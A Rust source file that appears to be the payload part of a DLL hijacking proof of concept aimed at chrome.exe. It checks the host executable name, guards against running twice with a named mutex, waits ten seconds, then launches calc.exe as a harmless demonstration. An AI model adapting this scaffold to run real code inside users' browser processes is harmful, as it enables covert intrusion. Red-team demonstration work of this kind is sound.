use windows::{
    Win32::{
        System::Threading::{CreateMutexW, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW},
        Foundation::{GetLastError, CloseHandle, ERROR_ALREADY_EXISTS},
    },
    core::{w, PCWSTR, PWSTR},
};

use std::{thread, time::Duration};

pub fn create_mutex()  -> bool {
    let mutex_name: PCWSTR = w!("Pengrey");

    unsafe {
        match CreateMutexW(Some(std::ptr::null()), false, mutex_name) {
            Ok(handle) => {
                if GetLastError() == ERROR_ALREADY_EXISTS {
                    let _ = CloseHandle(handle);
                    true
                } else {
                    false
                }
            }
            Err(_) => {
                true
            }
        }
    }
}

pub fn go() {
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(file_name) = exe_path.file_name() {
            if let Some(name_str) = file_name.to_str() {
                // Checks executable
                if name_str.eq_ignore_ascii_case("chrome.exe") {

                    // Checks if payload already ran
                    if !create_mutex() {

                        // Waits 10 sec (stabalization of dll loads in the parent exe)
                        thread::sleep(Duration::from_secs(10));

                        // Pops calc
                        unsafe {
                            let mut command = "calc.exe\0".encode_utf16().collect::<Vec<u16>>();

                            let _ = CreateProcessW(
                                PCWSTR::null(),
                                Some(PWSTR(command.as_mut_ptr())),
                                None, None, false, Default::default(), None, PCWSTR::null(),
                                &mut STARTUPINFOW { cb: std::mem::size_of::<STARTUPINFOW>() as u32, ..Default::default() },
                                &mut PROCESS_INFORMATION::default(),
                            );
                        }
                    }
                }
            }
        }
    }
}
